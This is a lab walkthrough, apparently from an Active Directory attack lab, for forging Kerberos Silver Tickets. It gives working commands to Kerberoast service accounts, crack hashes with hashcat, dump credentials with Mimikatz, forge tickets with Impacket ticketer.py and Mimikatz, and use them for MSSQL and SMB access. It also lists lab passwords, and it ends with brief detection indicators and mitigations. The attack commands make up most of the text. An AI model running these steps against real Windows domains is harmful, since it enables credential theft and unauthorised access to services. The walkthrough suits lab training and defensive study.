# Silver Ticket Attack

## Overview

A Silver Ticket is a forged Kerberos Service Ticket (TGS) signed with the **NTLM hash of a service account**.
Unlike a Golden Ticket (which forges a TGT), a Silver Ticket targets a **specific service** and never touches a DC, making it stealthier.

## Prerequisites

- NTLM hash of a service account (obtained via Kerberoasting, PTH, or DCSync)
- Domain SID
- Target service SPN and hostname

## Lab Accounts

| Service Account | SPN Example | Password |
|----------------|-------------|----------|
| `svc_sql` | `MSSQLSvc/DC-01.corp.local:1433` | `p@ssw0rd` |
| `svc_iis` | `HTTP/DC-01.corp.local` | `p@ssw0rd` |
| `svc_mssql` | `MSSQLSvc/DC-01.corp.local` | `p@ssw0rd` |
| `svc_web` | `HTTP/WS-01.corp.local` | `p@ssw0rd` |

## Step 1 — Get Domain SID

```powershell
# On attacker (WS-01) or any domain machine
Get-ADDomain | Select-Object DomainSID
# or
whoami /user   # strip the last RID (-500, etc.)
```

## Step 2 — Get Service Account Hash

### Option A: Kerberoast then Crack

```bash
# Impacket
GetUserSPNs.py corp.local/attacker.01:'p@ssw0rd' -dc-ip 192.168.56.10 -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Then convert cleartext password to NTLM
python3 -c "import hashlib; print(hashlib.new('md4', 'p@ssw0rd'.encode('utf-16-le')).hexdigest())"
```

### Option B: Extract Hash Directly (needs DA or local admin on DC)

```bash
# With mimikatz on DC-01
sekurlsa::logonpasswords
# or
lsadump::lsa /patch
```

### Option C: From Kerberoast Hash Directly

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$...*<hash>
# crack with hashcat -m 13100
```

## Step 3 — Forge Silver Ticket

### Using Impacket (Linux/WS-01)

```bash
ticketer.py \
  -nthash <NTLM_HASH_OF_svc_sql> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -spn MSSQLSvc/DC-01.corp.local:1433 \
  Administrator

# Output: Administrator.ccache
export KRB5CCNAME=Administrator.ccache
```

### Using Mimikatz (Windows)

```
# On any domain-joined machine
kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:DC-01.corp.local \
  /service:MSSQLSvc \
  /rc4:<NTLM_HASH_OF_svc_sql> \
  /ptt
```

`/ptt` injects the ticket directly into memory.

## Step 4 — Use the Silver Ticket

```bash
# MSSQL access via Impacket
mssqlclient.py -k -no-pass DC-01.corp.local

# SMB access (if forged for cifs)
smbclient.py -k -no-pass //DC-01.corp.local/C$

# Verify ticket in memory (Windows)
klist
```

## Why It Works

Service accounts authenticate clients using their own NTLM hash — **the DC is not consulted for TGS validation**. Since the ticket is signed by the service account's key, the service trusts it without phoning home.

## Detection

| Indicator | Event ID |
|-----------|----------|
| TGS without preceding TGT | 4769 (no 4768) |
| RC4 encryption for Kerberos (instead of AES) | 4769, EncryptionType = 0x17 |
| Ticket for non-existent user | 4627 |

## Mitigations (Disabled in This Lab)

- Set service account passwords > 25 characters (makes cracking infeasible)
- Use Managed Service Accounts (MSA/gMSA) — auto-rotate passwords
- Enable AES-only Kerberos — Silver Tickets with RC4 become detectable
